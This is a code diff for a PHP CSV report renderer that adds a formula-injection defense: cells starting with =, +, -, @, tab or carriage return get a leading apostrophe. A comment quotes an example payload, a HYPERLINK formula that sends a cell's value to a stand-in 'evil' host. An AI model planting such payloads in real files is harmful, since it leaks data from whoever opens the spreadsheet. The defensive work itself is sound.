@@ -30,34 +30,34 @@ class CsvReportRenderer
     {
         $handle = fopen('php://temp', 'r+');
 
-        fputcsv($handle, array_values($dataset->columns));
+        $this->putRow($handle, array_values($dataset->columns));
 
         foreach ($dataset->rows as $row) {
             $line = [];
             foreach (array_keys($dataset->columns) as $key) {
                 $line[] = $row[$key] ?? '';
             }
-            fputcsv($handle, $line);
+            $this->putRow($handle, $line);
         }
 
         if ($dataset->summary !== []) {
-            fputcsv($handle, []);
+            $this->putRow($handle, []);
             foreach ($dataset->summary as $label => $value) {
-                fputcsv($handle, [$label, $value]);
+                $this->putRow($handle, [$label, $value]);
             }
         }
 
         if ($dataset->notes !== []) {
-            fputcsv($handle, []);
+            $this->putRow($handle, []);
             foreach ($dataset->notes as $note) {
-                fputcsv($handle, [$note]);
+                $this->putRow($handle, [$note]);
             }
         }
 
-        fputcsv($handle, []);
-        fputcsv($handle, [$title]);
+        $this->putRow($handle, []);
+        $this->putRow($handle, [$title]);
         foreach ($meta as $label => $value) {
-            fputcsv($handle, [$label, $value]);
+            $this->putRow($handle, [$label, $value]);
         }
 
         rewind($handle);
@@ -65,5 +65,43 @@ class CsvReportRenderer
         fclose($handle);
 
         return $csv;
+    }
+
+    /**
+     * Every cell goes out through here, so nothing reaches the file without
+     * the formula check below — including the header labels, the summary and
+     * the footer, which carry report titles and filter values.
+     *
+     * @param array<int,mixed> $cells
+     */
+    private function putRow($handle, array $cells): void
+    {
+        fputcsv($handle, array_map([$this, 'neutralize'], $cells));
+    }
+
+    /**
+     * Defuse a cell that a spreadsheet would execute rather than display.
+     *
+     * Excel and Sheets treat a leading =, +, - or @ as the start of a formula,
+     * and these cells are not all trusted input: UserActivityReport writes
+     * `username_attempt`, which is verbatim whatever string was typed at the
+     * login form, and product, location and category names are user-entered
+     * too. A failed login as `=HYPERLINK("http://evil/"&A1,"click")` becomes a
+     * live link the moment an admin opens the CSV. The leading apostrophe is
+     * the standard defusal — spreadsheets strip it on display.
+     *
+     * Numbers are deliberately left alone. This file's contract is that a
+     * numeric column lands unquoted and summable, and a negative figure — a
+     * net adjustment, a remaining capacity — legitimately starts with '-'.
+     */
+    private function neutralize(mixed $value): mixed
+    {
+        if (! is_string($value) || $value === '' || is_numeric($value)) {
+            return $value;
+        }
+
+        // Tab and carriage return are here because a leading one of either
+        // lets the following character start the formula instead.
+        return preg_match('/^[=+\-@\t\r]/', $value) === 1 ? "'" . $value : $value;
     }
 }
